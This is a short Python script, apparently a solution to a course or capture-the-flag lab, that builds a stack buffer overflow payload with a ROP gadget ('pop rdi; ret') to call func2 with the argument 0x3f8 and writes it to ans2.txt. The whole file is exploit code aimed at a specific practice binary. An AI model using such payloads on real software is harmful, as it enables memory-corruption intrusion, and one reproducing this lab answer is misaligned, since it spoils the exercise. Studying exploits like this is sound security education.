import struct

pop_rdi_ret = 0x4012c7  # pop rdi; ret
func2_addr = 0x401216
param = 0x3f8

offset = 16

payload = b"A" * offset
payload += struct.pack('<Q', pop_rdi_ret)
payload += struct.pack('<Q', param)
payload += struct.pack('<Q', func2_addr)

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("[+] Payload written to ans2.txt")
print(f"[+] Calling func2(0x{param:x})")
